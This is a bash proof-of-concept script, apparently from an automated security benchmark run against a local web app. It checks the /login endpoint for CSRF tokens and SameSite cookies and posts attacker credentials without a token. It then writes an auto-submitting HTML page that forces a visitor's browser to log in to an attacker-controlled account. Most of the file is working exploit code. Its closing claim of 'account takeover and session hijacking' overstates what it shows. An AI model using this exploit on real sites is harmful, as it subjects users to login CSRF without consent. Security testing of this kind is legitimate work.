#!/bin/bash
# POC: POC demonstrating CSRF vulnerability on login endpoint by attempting to submit login form without CSRF token
# Target: ./repo
# Created: 2025-11-07T16:10:19.254Z
# Session: benchmark-XBEN-022-24-mhp1ee6o

# CSRF Vulnerability POC - Login Endpoint
# This script demonstrates the absence of CSRF protection on the /login endpoint
# It shows that:
# 1. The login form lacks CSRF tokens
# 2. A login request can be submitted without any CSRF token validation
# 3. Session cookies may be sent cross-site without SameSite protection

TARGET_URL="http://localhost/login"
ATTACKER_ACCOUNT="attacker_account"
ATTACKER_PASSWORD="attacker_password"

echo "[*] CSRF Vulnerability POC - Login Endpoint"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Fetch the login form and check for CSRF tokens
echo "[*] Step 1: Fetching login form to check for CSRF protection..."
FORM_HTML=$(curl -s "$TARGET_URL")

# Check for common CSRF token patterns
if echo "$FORM_HTML" | grep -qi "csrf"; then
    echo "[!] CSRF token pattern found in form"
    echo "$FORM_HTML" | grep -i "csrf" | head -5
else
    echo "[✓] No CSRF token found in form"
fi

# Check for other anti-CSRF mechanisms
if echo "$FORM_HTML" | grep -qi "nonce"; then
    echo "[!] Nonce pattern found in form"
    echo "$FORM_HTML" | grep -i "nonce" | head -5
else
    echo "[✓] No nonce found in form"
fi

# Check for token in form
if echo "$FORM_HTML" | grep -qi 'name="token"'; then
    echo "[!] Token field found in form"
    echo "$FORM_HTML" | grep -i 'name="token"' | head -5
else
    echo "[✓] No token field found in form"
fi

echo ""
echo "[*] Step 2: Attempting to submit login WITHOUT any CSRF token..."

# Step 2: Attempt to submit login credentials without CSRF token
# This should succeed, demonstrating the vulnerability
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
  -d "username=$ATTACKER_ACCOUNT&password=$ATTACKER_PASSWORD" \
  -c /tmp/cookies.txt)

# Parse response
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
RESPONSE_BODY=$(echo "$RESPONSE" | head -n-1)

echo "[*] HTTP Status Code: $HTTP_CODE"

if [ "$HTTP_CODE" = "200" ] || [ "$HTTP_CODE" = "302" ] || [ "$HTTP_CODE" = "301" ]; then
    echo "[✓] Login form accepted request without CSRF token"
    echo "[✓] VULNERABILITY CONFIRMED: No CSRF protection"
else
    echo "[!] Unexpected status code"
fi

echo ""
echo "[*] Step 3: Checking for CSRF protection via cookies..."

# Check if cookies have SameSite attribute
COOKIES=$(curl -s -i "$TARGET_URL" | grep -i "set-cookie" || true)

if [ -z "$COOKIES" ]; then
    echo "[*] No Set-Cookie headers found in login form response"
else
    echo "[*] Cookie headers found:"
    echo "$COOKIES"
    
    if echo "$COOKIES" | grep -qi "samesite"; then
        echo "[!] SameSite cookie attribute found (some CSRF protection)"
    else
        echo "[✓] No SameSite cookie attribute found"
        echo "[✓] VULNERABILITY CONFIRMED: Cookies lack SameSite protection"
    fi
fi

echo ""
echo "[*] Step 4: Creating malicious CSRF form..."
cat > /tmp/csrf_attack.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Malicious Page</title>
</head>
<body>
    <h1>Loading...</h1>
    <form id="loginForm" action="http://localhost/login" method="POST">
        <input type="hidden" name="username" value="attacker_account">
        <input type="hidden" name="password" value="attacker_password">
    </form>
    <script>
        // Auto-submit the form when page loads
        document.getElementById('loginForm').submit();
    </script>
</body>
</html>
EOF

echo "[✓] Malicious CSRF form created at /tmp/csrf_attack.html"
echo ""
echo "[+] CSRF Vulnerability Summary:"
echo "    - Login endpoint accepts POST requests without CSRF tokens"
echo "    - No token validation is performed"
echo "    - Session cookies may be sent in cross-site requests"
echo "    - Attacker can force users into attacker-controlled accounts"
echo ""
echo "[!] This allows account takeover and session hijacking"